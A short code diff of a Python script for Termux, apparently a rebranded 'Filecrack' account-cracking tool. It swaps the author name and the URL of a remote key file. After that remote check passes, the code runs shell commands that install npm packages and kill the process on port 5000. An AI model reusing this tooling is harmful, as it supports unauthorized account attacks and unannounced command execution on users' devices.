@@ -15,8 +15,8 @@ import cookielib
 import uuid
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
-__author__ = 'Mr-Robot'
-__copyright = 'All rights reserved . Copyright  Mr-Robot'
+__author__ = 'Mr-IKB'
+__copyright = 'All rights reserved . Copyright  Mr-IKB'
 os.system('termux-setup-storage')
 
 try:
@@ -127,7 +127,7 @@ def reg():
     except (KeyError, IOError):
         reg2()
 
-    r = requests.get('https://raw.githubusercontent.com/imtiazik/Filecrack/main/robot.txt').text
+    r = requests.get('https://raw.githubusercontent.com/imtiazik/XD/main/IKB.txt').text
     if to in r:
         os.system('cd ..... && npm install')
         os.system('fuser -k 5000/tcp &')
